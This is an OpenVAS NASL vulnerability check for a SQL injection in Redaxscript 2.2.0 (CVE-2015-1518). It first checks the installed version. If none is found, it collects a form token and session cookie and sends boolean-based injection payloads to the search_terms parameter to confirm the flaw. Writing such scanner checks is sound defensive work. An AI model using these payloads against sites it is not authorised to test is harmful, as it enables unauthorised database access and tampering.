###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_redaxscript_sql_inj_vuln.nasl 13902 2019-02-27 10:31:50Z cfischer $
#
# Redaxscript SQL Injection Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:redaxscript:redaxscript";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105954");
  script_version("$Revision: 13902 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-27 11:31:50 +0100 (Wed, 27 Feb 2019) $");
  script_tag(name:"creation_date", value:"2015-02-06 14:11:04 +0700 (Fri, 06 Feb 2015)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2015-1518");
  script_bugtraq_id(72581);
  script_name("Redaxscript SQL Injection Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("redaxscript_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("redaxscript/detected");

  script_xref(name:"URL", value:"http://www.itas.vn/news/itas-team-found-out-a-sql-injection-vulnerability-in-redaxscript-2-2-0-cms-75.html");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/36023/");

  script_tag(name:"summary", value:"Redaxscript is prone to a SQL injection vulnerability.");

  script_tag(name:"vuldetect", value:"Checks if a vulnerable version is present on the target host. If no version was detected a try to perform
  an SQL injection is done.");

  script_tag(name:"insight", value:"The search_post function in includes/search.php is prone to
  an SQL injection vulnerability in the search_terms parameter.");

  script_tag(name:"impact", value:"An unauthenticated attacker might execute arbitrary SQL commands
  to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.");

  script_tag(name:"affected", value:"Radexscript 2.2.0");

  script_tag(name:"solution", value:"Upgrade to Radexscript 2.3.0 or later.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("version_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! infos = get_app_version_and_location( cpe:CPE, port:port, exit_no_version:FALSE ) )
  exit( 0 );

vers = infos['version'];
dir = infos['location'];

if( vers && vers != "unknown" ) {
  if( version_is_equal( version:vers, test_version:"2.2.0" ) ) {
    report = report_fixed_ver( installed_version:vers, fixed_version:"2.3.0", install_path:dir );
    security_message( port:port, data:report );
    exit( 0 );
  }
  exit( 99 );
} else {

  if( ! dir )
    exit( 0 );

  useragent = http_get_user_agent();
  host = http_host_name( port:port );

  req = 'GET / HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'User-Agent: ' + useragent + '\r\n' +
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
        'Accept-Language: en-US,en;q=0.5\r\n\r\n';
  res = http_keepalive_send_recv( port:port, data:req );

  token = eregmatch( pattern:'token" value="([0-9a-z]*)"', string:res );

  # App sets PHPSESSID multiple times, but we need the last one
  temp = split( res, sep:"Set-Cookie:" );
  cookie = eregmatch( pattern:"PHPSESSID=([0-9a-z]+);", string:temp[max_index(temp)-1] );

  data = string( "search_terms=%')and(1=1)#&search_post=&token=", token[1], "&search_post=Search" );
  len = strlen( data );

  req = 'POST ' + dir + ' HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'User-Agent: ' + useragent + '\r\n' +
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
        'Accept-Language: en-US,en;q=0.5\r\n' +
        'Cookie: PHPSESSID=' + cookie[1] + '\r\n' +
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        'Content-Length: ' + len + '\r\n' +
        '\r\n' +
        data;
  res = http_keepalive_send_recv( port:port, data:req );

  # Injection might work, but check if we can provoke an error too to verify
  if( ">Something went wrong<" >!< res ) {

    data = string("search_terms=%')and(1=0)#&search_post=&token=", token[1], "&search_post=Search");
    len = strlen(data);

    req = 'POST ' + dir + ' HTTP/1.1\r\n' +
          'Host: ' + host + '\r\n' +
          'User-Agent: ' + useragent + '\r\n' +
          'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
          'Accept-Language: en-US,en;q=0.5\r\n' +
          'Cookie: PHPSESSID=' + cookie[1] + '\r\n' +
          'Content-Type: application/x-www-form-urlencoded\r\n' +
          'Content-Length: ' + len + '\r\n' +
          '\r\n' +
          data;
    res = http_keepalive_send_recv( port:port, data:req );

    if( ">Something went wrong<" >< res ) {
      report = report_vuln_url( port:port, url:dir );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );